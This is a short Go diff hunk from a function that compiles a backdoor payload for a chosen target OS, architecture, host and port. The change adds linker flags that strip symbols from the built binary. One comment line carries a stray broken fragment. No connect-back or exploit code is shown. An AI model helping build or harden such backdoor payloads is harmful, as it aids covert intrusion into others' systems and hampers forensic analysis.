@@ -41,7 +41,7 @@ func BuildPayload(outputPath, targetOS, targetArch, host, port, mode string, ena
 
 	// Configurar variables de entorno para la compilación''")
 	// Ejecutar build
-	cmd := exec.Command("go", "build", "-o", outputPath, "main.go")
+	cmd := exec.Command("go", "build", "-ldflags=-s -w", "-o", outputPath, "main.go")
 	cmd.Dir = backdoorDir
 	cmd.Env = append(os.Environ(),
 		"GOOS="+targetOS,
